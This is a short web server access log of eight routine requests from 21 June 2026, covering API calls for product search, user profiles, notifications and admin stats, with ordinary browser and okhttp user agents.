103.7.112.45 - - [21/Jun/2026:03:23:53 +0530] "GET /api/v2/products/search HTTP/1.1" 200 47797 "https://dashboard.example.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.888
125.63.44.12 - - [21/Jun/2026:05:04:50 +0530] "OPTIONS /ws/notifications HTTP/1.1" 200 28061 "https://github.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=1.310
103.195.201.34 - - [21/Jun/2026:05:33:22 +0530] "PUT /ready HTTP/1.1" 200 16022 "https://app.example.com" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" rt=0.832
210.18.55.34 - api-client [21/Jun/2026:08:07:24 +0530] "POST /api/v2/users/profile HTTP/1.1" 200 34773 "https://dashboard.example.com" "okhttp/4.12.0" rt=1.134
180.151.34.78 - - [21/Jun/2026:11:35:34 +0530] "PUT /api/v2/notifications HTTP/1.1" 200 26738 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15" rt=0.470
180.151.34.78 - - [21/Jun/2026:13:49:01 +0530] "GET /api/v2/admin/stats HTTP/1.1" 301 223 "https://app.example.com" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=0.904
103.195.201.34 - - [21/Jun/2026:14:34:49 +0530] "GET /static/vendors.js HTTP/1.1" 204 20 "https://app.example.com" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=1.416
175.101.120.56 - - [21/Jun/2026:15:35:38 +0530] "OPTIONS /api/v2/users/profile HTTP/1.1" 200 79714 "https://www.google.com/" "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36" rt=1.234
